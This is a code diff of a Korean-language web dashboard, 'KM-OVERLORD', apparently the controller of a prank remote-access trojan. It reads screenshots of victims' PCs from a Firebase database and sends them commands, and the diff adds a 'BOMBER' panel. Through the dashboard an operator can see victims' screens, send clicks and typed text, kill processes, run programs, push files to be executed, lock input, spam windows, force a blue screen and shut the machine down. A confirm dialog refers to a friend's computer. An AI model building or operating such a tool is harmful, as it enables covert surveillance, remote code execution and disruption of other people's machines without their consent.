@@ -2,80 +2,91 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>KM-OVERLORD V3.0 FINAL</title>
+    <title>KM-OVERLORD V4.0 : THE BOMBER</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
-        h1 { text-align: center; text-shadow: 0 0 10px #0f0; }
+        h1 { text-align: center; text-shadow: 0 0 10px #0f0; letter-spacing: 3px; }
         
-        /* 메인 그리드 */
+        /* 메인 대시보드 그리드 */
         .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
-        .pc-card { border: 2px solid #0f0; background: #111; padding: 15px; cursor: pointer; border-radius: 5px; }
-        .pc-card:hover { box-shadow: 0 0 15px #0f0; }
+        .pc-card { border: 2px solid #0f0; background: #111; padding: 15px; cursor: pointer; border-radius: 5px; transition: 0.3s; }
+        .pc-card:hover { box-shadow: 0 0 20px #0f0; transform: translateY(-5px); }
         .pc-card.offline { border-color: #444; color: #444; }
-        .screen-img { width: 100%; border: 1px solid #333; margin-top: 10px; }
+        .screen-img { width: 100%; border: 1px solid #333; margin-top: 10px; background: #050505; }
 
-        /* 모달 상세창 */
-        #modal { display:none; position:fixed; top:2%; left:2%; width:96%; height:92%; background: #0a0a0a; border: 3px solid #0f0; z-index: 100; padding: 20px; box-shadow: 0 0 100px #000; overflow-y: auto; }
+        /* 제어 모달창 */
+        #modal { display:none; position:fixed; top:2%; left:2%; width:96%; height:92%; background: rgba(5, 5, 5, 0.98); border: 3px solid #0f0; z-index: 100; padding: 20px; box-shadow: 0 0 100px #000; overflow-y: auto; }
         .control-panel { display: flex; gap: 20px; flex-wrap: wrap; }
-        .side-panel { flex: 1; min-width: 300px; background: #151515; padding: 15px; border-radius: 10px; }
+        .side-panel { flex: 1; min-width: 300px; background: #151515; padding: 15px; border-radius: 10px; border: 1px solid #333; }
         
-        /* 프로세스 리스트 스타일 */
-        #proc-list { width: 100%; height: 200px; background: #000; color: #0f0; border: 1px solid #0f0; font-size: 12px; margin-bottom: 10px; }
+        /* 입력 및 버튼 */
+        input, select, button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; font-family: inherit; }
+        button:hover { background: #0f0; color: #000; cursor: pointer; font-weight: bold; }
         
-        input, button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px; margin: 5px 0; width: 100%; box-sizing: border-box; }
-        button:hover { background: #0f0; color: #000; cursor: pointer; }
-        .danger { border-color: #f00; color: #f00; }
-        .danger:hover { background: #f00; color: #fff; }
+        /* 위험 구역 스타일 */
+        .bomber-zone { border: 2px solid #f00; padding: 15px; margin-top: 15px; border-radius: 5px; background: rgba(50, 0, 0, 0.2); }
+        .danger-btn { border-color: #f00; color: #f00; }
+        .danger-btn:hover { background: #f00; color: #fff; }
         
-        .drop-zone { border: 2px dashed #0f0; padding: 20px; text-align: center; margin-top: 10px; font-size: 12px; }
-        .close-btn { color: #f00; float: right; cursor: pointer; font-size: 30px; }
+        .close-btn { color: #f00; float: right; cursor: pointer; font-size: 40px; line-height: 30px; }
+        .drop-zone { border: 2px dashed #0f0; padding: 20px; text-align: center; margin-top: 10px; font-size: 13px; color: #888; }
     </style>
 </head>
 <body>
 
-    <h1>[ KM-OVERLORD V3.0 CONTROL CENTER ]</h1>
+    <h1>[ KM-OVERLORD V4.0 CONTROL CENTER ]</h1>
     <div id="pc-grid" class="grid"></div>
 
     <div id="modal">
         <span class="close-btn" onclick="closeModal()">&times;</span>
-        <h2 id="modal-title">PC CONTROL</h2>
+        <h2 id="modal-title" style="color:#fff;">TARGET: NONE</h2>
         
         <div class="control-panel">
             <div style="flex: 2; min-width: 450px;">
-                <img id="modal-screen" style="width:100%; border:1px solid #0f0; cursor:crosshair;" onclick="handleRemoteClick(event)">
-                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:10px;">
+                <img id="modal-screen" style="width:100%; border:1px solid #0f0; cursor:crosshair;" onclick="handleRemoteClick(event)" title="클릭 시 원격 클릭 전송">
+                
+                <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:10px; margin-top:15px;">
                     <button onclick="sendCmd('screen_off')">모니터 끄기</button>
-                    <button onclick="sendCmd('url', prompt('열고 싶은 사이트 주소(URL)를 입력하세요:'))">🌐 브라우저 열기 (URL)</button>
-                    <button class="danger" onclick="if(confirm('진짜 끌 거야?')) sendCmd('shutdown')">PC 종료 (30초)</button>
-                    <button onclick="sendCmd('abort_shutdown')">종료 취소</button>
-                    <button onclick="sendCmd('msg', prompt('메시지:'))">메시지 전송</button>
+                    <button onclick="sendCmd('url', prompt('URL 입력 (http 포함):'))">🌐 URL 열기</button>
+                    <button onclick="sendCmd('msg', prompt('전송할 메시지:'))">메시지 전송</button>
+                </div>
+
+                <div class="bomber-zone">
+                    <label style="color:#f00; font-weight:bold; display:block; margin-bottom:10px;">☣️ THE BOMBER (시스템 마비 기능)</label>
+                    <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:10px;">
+                        <button class="danger-btn" onclick="sendCmd('bomb_window')">창 폭탄(50개)</button>
+                        <button class="danger-btn" onclick="sendCmd('lock_input')">입력 봉쇄(10s)</button>
+                        <button class="danger-btn" onclick="if(confirm('진짜 블루스크린을 띄우겠습니까? 친구 컴이 재부팅됩니다.')) sendCmd('bsod')">BSOD 호출</button>
+                    </div>
+                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:10px;">
+                        <button class="danger-btn" onclick="if(confirm('30초 후 종료합니다.')) sendCmd('shutdown')">시스템 종료</button>
+                        <button onclick="sendCmd('abort_shutdown')" style="border-color:#0ff; color:#0ff;">종료 취소</button>
+                    </div>
                 </div>
             </div>
 
             <div class="side-panel">
-                <label>🏷️ 별명 설정</label>
-                <div style="display:flex; gap:5px;"><input type="text" id="nick-input"><button style="width:60px;" onclick="saveNickname()">저장</button></div>
+                <label>🏷️ 별명(Nickname)</label>
+                <div style="display:flex; gap:5px;"><input type="text" id="nick-input"><button style="width:70px;" onclick="saveNickname()">변경</button></div>
 
-                <label>⌨️ 키보드 입력</label>
-                <div style="display:flex; gap:5px;"><input type="text" id="type-input"><button style="width:60px;" onclick="sendType()">전송</button></div>
+                <label style="margin-top:10px; display:block;">⌨️ 키보드 원격 타이핑</label>
+                <div style="display:flex; gap:5px;"><input type="text" id="type-input"><button style="width:70px;" onclick="sendType()">전송</button></div>
 
-                <label>🚀 프로세스 목록 (선택하여 종료)</label>
+                <label style="margin-top:10px; display:block;">🚀 실시간 프로세스 (선택 종료)</label>
                 <select id="proc-list" size="10"></select>
-                <button class="danger" onclick="killSelected()">선택 앱 종료</button>
+                <button class="danger-btn" onclick="killSelected()">프로세스 강제 종료</button>
                 
-                <label style="margin-top:10px; display:block;">📂 앱 실행 (예: notepad)</label>
-                <div style="display:flex; gap:5px;"><input type="text" id="run-input"><button style="width:60px;" onclick="sendCmd('run', document.getElementById('run-input').value)">실행</button></div>
+                <label style="margin-top:10px; display:block;">📂 경로로 앱 실행</label>
+                <div style="display:flex; gap:5px;"><input type="text" id="run-input" placeholder="calc, notepad..."><button style="width:70px;" onclick="sendCmd('run', document.getElementById('run-input').value)">실행</button></div>
 
-                <div id="drop-zone" class="drop-zone">파일 드롭하여 원격 설치</div>
+                <div id="drop-zone" class="drop-zone">이곳에 파일을 드롭하여 전송 및 실행</div>
             </div>
         </div>
     </div>
 
     <script>
         const BASE_URL = "https://prank-e1fd9-default-rtdb.firebaseio.com/";
-        let currentPC = "";
-        let nicknames = {};
-        let isTyping = false;
+        let currentPC = "", nicknames = {}, isTyping = false;
 
         document.addEventListener('focusin', (e) => { if(e.target.tagName === 'INPUT') isTyping = true; });
         document.addEventListener('focusout', (e) => { if(e.target.tagName === 'INPUT') isTyping = false; });
@@ -103,7 +114,7 @@
                 card.onclick = () => openModal(id, pc);
                 card.innerHTML = `
                     <div style="font-weight:bold; color:#fff;">${nicknames[id] || id}</div>
-                    <div style="font-size:10px;">${id} | ${pc.ip || '0.0.0.0'}</div>
+                    <div style="font-size:10px; color:#888;">${pc.ip || '0.0.0.0'} [${isOnline ? 'ONLINE' : 'OFFLINE'}]</div>
                     <img src="data:image/jpeg;base64,${pc.screen_img}" class="screen-img">
                 `;
                 grid.appendChild(card);
@@ -131,14 +142,14 @@
         function openModal(id, pc) {
             currentPC = id;
             document.getElementById('modal').style.display = "block";
-            document.getElementById('modal-title').innerText = "CONTROL: " + (nicknames[id] || id);
+            document.getElementById('modal-title').innerText = "TARGET: " + (nicknames[id] || id);
             document.getElementById('nick-input').value = nicknames[id] || "";
         }
 
         function closeModal() { document.getElementById('modal').style.display = "none"; currentPC = ""; }
 
         async function sendCmd(cmd, val = "") {
-            if (!currentPC || val === null) return; // 취소 누르면 중단
+            if (!currentPC || val === null) return;
             await fetch(`${BASE_URL}pcs/${currentPC}.json`, {
                 method: 'PATCH',
                 body: JSON.stringify({ "cmd": cmd, "val": val, "is_new": true })
@@ -159,7 +170,7 @@
         async function saveNickname() {
             const nick = document.getElementById('nick-input').value;
             await fetch(`${BASE_URL}nicknames/${currentPC}.json`, { method: 'PUT', body: JSON.stringify(nick) });
-            alert("저장됨");
+            alert("별명이 저장되었습니다.");
             updateData();
         }
 
@@ -171,8 +182,8 @@
         }
 
         const dz = document.getElementById('drop-zone');
-        dz.ondragover = (e) => { e.preventDefault(); dz.style.background = "#222"; };
-        dz.ondragleave = () => { dz.style.background = "transparent"; };
+        dz.ondragover = (e) => { e.preventDefault(); dz.style.borderColor = "#fff"; };
+        dz.ondragleave = () => { dz.style.borderColor = "#0f0"; };
         dz.ondrop = (e) => {
             e.preventDefault();
             const file = e.dataTransfer.files[0];
@@ -183,7 +194,7 @@
                     method: 'PATCH',
                     body: JSON.stringify({ "file_data": b64, "file_name": file.name, "file_is_new": true })
                 });
-                alert("파일 전송됨!");
+                alert("파일 전송 완료: " + file.name);
             };
             reader.readAsDataURL(file);
         };
